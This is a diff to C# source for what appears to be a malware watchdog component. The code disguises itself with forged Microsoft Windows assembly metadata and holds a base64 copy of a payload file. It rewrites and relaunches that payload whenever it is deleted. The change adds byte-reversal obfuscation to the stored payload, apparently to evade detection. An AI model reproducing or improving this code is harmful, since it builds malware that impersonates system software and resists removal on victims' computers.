@@ -4,8 +4,10 @@ using System.IO;
 using System.Management;
 using System.Reflection;
 using System.Security.Cryptography;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
+using System.Linq;
 #if DefDebug
 using System.Windows.Forms;
 #endif
@@ -15,6 +17,8 @@ using System.Windows.Forms;
 [assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
 [assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
 [assembly: AssemblyFileVersion("10.0.19041.746")]
+
+[assembly: Guid("%Guid%")]
 
 public partial class Program
 {
@@ -27,7 +31,7 @@ public partial class Program
         try
         {
             plp = PayloadPath;
-            xm = Convert.ToBase64String(File.ReadAllBytes(plp));
+            xm = Convert.ToBase64String(File.ReadAllBytes(plp).Reverse().ToArray());
             RWDLoop();
         }
         catch (Exception ex)
@@ -47,7 +51,7 @@ public partial class Program
             {
                 if (!File.Exists(plp))
                 {
-                    File.WriteAllBytes(plp, Convert.FromBase64String(xm));
+                    File.WriteAllBytes(plp, Convert.FromBase64String(xm).Reverse().ToArray());
                     Process.Start(new ProcessStartInfo
                     {
                         FileName = plp,
@@ -75,7 +79,7 @@ public partial class Program
                 checkcount = 0;
                 if (!File.Exists(plp))
                 {
-                    File.WriteAllBytes(plp, Convert.FromBase64String(xm));
+                    File.WriteAllBytes(plp, Convert.FromBase64String(xm).Reverse().ToArray());
                     Process.Start(new ProcessStartInfo
                     {
                         FileName = plp,
